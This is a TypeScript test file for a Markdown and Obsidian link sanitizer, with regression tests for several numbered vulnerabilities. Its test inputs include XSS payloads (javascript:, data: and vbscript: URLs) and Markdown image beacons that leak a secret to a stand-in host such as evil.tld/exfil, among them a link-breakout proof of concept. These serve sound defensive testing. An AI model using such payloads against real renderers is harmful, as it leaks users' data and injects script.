/**
 * markdownSanitizer.test.ts
 * Markdownサニタイザーのテスト
 *
 * 【Code Review P1】: XSS対策 - Markdownリンクのサニタイズ
 */

import { sanitizeMarkdownLinks, sanitizeAllMarkdownLinks, sanitizeForObsidian, escapeObsidianWikilinks, sanitizeUrlForMarkdownTarget } from '../markdownSanitizer.js';

describe('markdownSanitizer', () => {
    describe('sanitizeMarkdownLinks', () => {
        it('should escape Markdown links with http URLs', () => {
            const input = '[悪意あるリンク](http://malicious.com)';
            const expected = '\\[悪意あるリンク\\]\\(http://malicious.com\\)';
            expect(sanitizeMarkdownLinks(input)).toBe(expected);
        });

        it('should escape Markdown links with https URLs', () => {
            const input = '[Click here](https://example.com)';
            const expected = '\\[Click here\\]\\(https://example.com\\)';
            expect(sanitizeMarkdownLinks(input)).toBe(expected);
        });

        it('should handle multiple Markdown links', () => {
            const input = 'Check [link1](https://a.com) and [link2](https://b.com)';
            const expected = 'Check \\[link1\\]\\(https://a.com\\) and \\[link2\\]\\(https://b.com\\)';
            expect(sanitizeMarkdownLinks(input)).toBe(expected);
        });

        it('should not escape non-URL patterns', () => {
            const input = '[これは括弧で囲まれたテキスト]';
            expect(sanitizeMarkdownLinks(input)).toBe(input);
        });

        it('should not escape relative URL patterns', () => {
            const input = '[link](/path/to/page)';
            expect(sanitizeMarkdownLinks(input)).toBe(input);
        });

        it('should handle empty string', () => {
            expect(sanitizeMarkdownLinks('')).toBe('');
        });

        it('should handle null input', () => {
            expect(sanitizeMarkdownLinks(null)).toBeNull();
        });

        it('should handle undefined input', () => {
            expect(sanitizeMarkdownLinks(undefined)).toBeUndefined();
        });

        it('should handle non-string input', () => {
            expect(sanitizeMarkdownLinks(123 as any)).toBe(123);
        });

        it('should preserve normal text without links', () => {
            const input = 'This is normal text without any links.';
            expect(sanitizeMarkdownLinks(input)).toBe(input);
        });

        it('should handle mixed content', () => {
            const input = 'Before [link](https://example.com) after';
            const expected = 'Before \\[link\\]\\(https://example.com\\) after';
            expect(sanitizeMarkdownLinks(input)).toBe(expected);
        });
    });

    describe('sanitizeAllMarkdownLinks', () => {
        it('should escape all Markdown link patterns regardless of URL format', () => {
            const input = '[link](/relative/path)';
            const expected = '\\[link\\]\\(/relative/path\\)';
            expect(sanitizeAllMarkdownLinks(input)).toBe(expected);
        });

        it('should escape links with any content in parentheses', () => {
            const input = '[text](anything)';
            const expected = '\\[text\\]\\(anything\\)';
            expect(sanitizeAllMarkdownLinks(input)).toBe(expected);
        });

        it('should escape image syntax ![alt](url) (VULN-006)', () => {
            const input = '![tracking-pixel](https://evil.tld/exfil)';
            const expected = '!\\[tracking-pixel\\]\\(https://evil.tld/exfil\\)';
            expect(sanitizeAllMarkdownLinks(input)).toBe(expected);
        });

        it('should handle mixed links and images', () => {
            const input = '[link](https://a.com) and ![img](https://b.com/pic.png)';
            const expected = '\\[link\\]\\(https://a.com\\) and !\\[img\\]\\(https://b.com/pic.png\\)';
            expect(sanitizeAllMarkdownLinks(input)).toBe(expected);
        });

        it('should return empty string for empty input', () => {
            expect(sanitizeAllMarkdownLinks('')).toBe('');
        });

        it('should handle null input', () => {
            expect(sanitizeAllMarkdownLinks(null as any)).toBeNull();
        });

        it('should handle undefined input', () => {
            expect(sanitizeAllMarkdownLinks(undefined as any)).toBeUndefined();
        });

        it('should handle non-string input', () => {
            expect(sanitizeAllMarkdownLinks(42 as any)).toBe(42);
        });
    });

    describe('sanitizeForObsidian', () => {
        it('should apply all sanitization rules', () => {
            const input = 'Visit [malicious](https://bad.com) for more info';
            const expected = 'Visit \\[malicious\\]\\(https://bad.com\\) for more info';
            expect(sanitizeForObsidian(input)).toBe(expected);
        });

        it('should handle complex content', () => {
            const input = 'Title: [Attack](https://evil.com)\nSummary: More [links](https://bad.org)';
            const expected = 'Title: \\[Attack\\]\\(https://evil.com\\)\nSummary: More \\[links\\]\\(https://bad.org\\)';
            expect(sanitizeForObsidian(input)).toBe(expected);
        });

        it('should preserve legitimate content', () => {
            const input = 'This is a legitimate summary without any links.';
            expect(sanitizeForObsidian(input)).toBe(input);
        });

        it('should return empty string for empty input', () => {
            expect(sanitizeForObsidian('')).toBe('');
        });

        it('should handle null input', () => {
            expect(sanitizeForObsidian(null as any)).toBeNull();
        });

        it('should handle undefined input', () => {
            expect(sanitizeForObsidian(undefined as any)).toBeUndefined();
        });

        it('should handle non-string input', () => {
            expect(sanitizeForObsidian(99 as any)).toBe(99);
        });

        // VULN-002/005 regression tests
        it('should escape javascript: scheme links (VULN-002)', () => {
            const input = '[Click here](javascript:alert(document.domain))';
            const result = sanitizeForObsidian(input);
            expect(result).toContain('\\[Click here\\]');
            expect(result).not.toMatch(/\[Click here\]\(javascript:/);
        });

        it('should escape data: scheme links', () => {
            const input = '[evil](data:text/html,<script>alert(1)</script>)';
            const result = sanitizeForObsidian(input);
            expect(result).toContain('\\[evil\\]');
        });

        it('should escape Obsidian wikilink syntax [[...]]', () => {
            const input = 'See [[Private Note]] for details';
            const result = sanitizeForObsidian(input);
            expect(result).toContain('\\[\\[Private Note\\]\\]');
            expect(result).not.toMatch(/\[\[Private Note\]\]/);
        });

        it('should escape Obsidian embed syntax ![[...]]', () => {
            const input = 'Embedded: ![[Secret Document]]';
            const result = sanitizeForObsidian(input);
            expect(result).toContain('!\\[\\[Secret Document\\]\\]');
            expect(result).not.toMatch(/!\[\[Secret Document\]\]/);
        });

        it('should escape both markdown links and wikilinks in same input', () => {
            const input = 'Click [here](https://evil.com) or see [[Passwords]]';
            const result = sanitizeForObsidian(input);
            expect(result).toContain('\\[here\\]');
            expect(result).toContain('\\[\\[Passwords\\]\\]');
        });

        // VULN-006 regression tests
        it('should escape image syntax ![alt](url) (VULN-006)', () => {
            const input = '![tracking-pixel](http://evil.tld/exfil?data=SECRET)';
            const result = sanitizeForObsidian(input);
            expect(result).toContain('!\\[tracking-pixel\\]');
            expect(result).not.toMatch(/!\[tracking-pixel\]\(http:\/\/evil\.tld/);
        });

        it('should escape mixed [link](url) and ![image](url) in same input', () => {
            const input = 'See [here](http://a.com) and ![img](http://b.com/pic.png)';
            const result = sanitizeForObsidian(input);
            expect(result).toContain('\\[here\\]');
            expect(result).toContain('!\\[img\\]');
        });

        it('should escape image syntax with https URLs', () => {
            const input = 'Image: ![logo](https://cdn.evil.com/tracker.svg)';
            const result = sanitizeForObsidian(input);
            expect(result).toBe('Image: !\\[logo\\]\\(https://cdn.evil.com/tracker.svg\\)');
        });
    });

    describe('escapeObsidianWikilinks', () => {
        it('should escape [[wikilink]] pattern', () => {
            expect(escapeObsidianWikilinks('See [[Note]]')).toBe('See \\[\\[Note\\]\\]');
        });

        it('should escape ![[embed]] pattern', () => {
            expect(escapeObsidianWikilinks('See ![[Note]]')).toBe('See !\\[\\[Note\\]\\]');
        });

        it('should handle multiple wikilinks', () => {
            const input = '[[A]] and [[B]]';
            expect(escapeObsidianWikilinks(input)).toBe('\\[\\[A\\]\\] and \\[\\[B\\]\\]');
        });

        it('should return empty string for empty input', () => {
            expect(escapeObsidianWikilinks('')).toBe('');
        });

        it('should handle null input', () => {
            expect(escapeObsidianWikilinks(null as any)).toBeNull();
        });

        it('should handle undefined input', () => {
            expect(escapeObsidianWikilinks(undefined as any)).toBeUndefined();
        });

        it('should not modify text without wikilinks', () => {
            const input = 'Normal text without wikilinks';
            expect(escapeObsidianWikilinks(input)).toBe(input);
        });
    });

    describe('sanitizeUrlForMarkdownTarget', () => {
        it('should encode parentheses', () => {
            const input = 'https://evil.tld/x)![beacon](https://evil.tld/exfil.png';
            const result = sanitizeUrlForMarkdownTarget(input);
            expect(result).not.toContain(')');
            expect(result).not.toContain('(');
            expect(result).toContain('%29');
            expect(result).toContain('%28');
        });

        it('should encode square brackets', () => {
            const input = 'https://evil.tld/path[test]';
            const result = sanitizeUrlForMarkdownTarget(input);
            expect(result).not.toContain('[');
            expect(result).not.toContain(']');
            expect(result).toContain('%5B');
            expect(result).toContain('%5D');
        });

        it('should encode exclamation marks', () => {
            const input = 'https://evil.tld/!inject';
            const result = sanitizeUrlForMarkdownTarget(input);
            expect(result).not.toContain('!');
            expect(result).toContain('%21');
        });

        it('should preserve normal URL characters', () => {
            const input = 'https://example.com/path?q=hello&lang=en#section';
            expect(sanitizeUrlForMarkdownTarget(input)).toBe(input);
        });

        it('should handle empty string', () => {
            expect(sanitizeUrlForMarkdownTarget('')).toBe('');
        });

        it('should handle null input', () => {
            expect(sanitizeUrlForMarkdownTarget(null as any)).toBeNull();
        });

        it('should handle VULN-001 PoC payload', () => {
            const input = 'https://evil.tld/x)%20![beacon](https://evil.tld/exfil.png?leak=SECRET';
            const result = sanitizeUrlForMarkdownTarget(input);
            // After encoding, the result should not break out of markdown link syntax
            expect(result).not.toContain(')');
            expect(result).not.toContain('!');
            expect(result).not.toContain('[');
        });

        // URL scheme validation tests
        it('should reject javascript: URLs', () => {
            const result = sanitizeUrlForMarkdownTarget('javascript:alert(document.domain)');
            expect(result).toBe('about:blank');
        });

        it('should reject data: URLs', () => {
            const result = sanitizeUrlForMarkdownTarget('data:text/html,<script>alert(1)</script>');
            expect(result).toBe('about:blank');
        });

        it('should reject vbscript: URLs', () => {
            const result = sanitizeUrlForMarkdownTarget('vbscript:msgbox("xss")');
            expect(result).toBe('about:blank');
        });

        it('should accept http URLs', () => {
            const result = sanitizeUrlForMarkdownTarget('http://example.com/page');
            expect(result).toBe('http://example.com/page');
        });

        it('should accept https URLs', () => {
            const result = sanitizeUrlForMarkdownTarget('https://example.com/page');
            expect(result).toBe('https://example.com/page');
        });
    });
});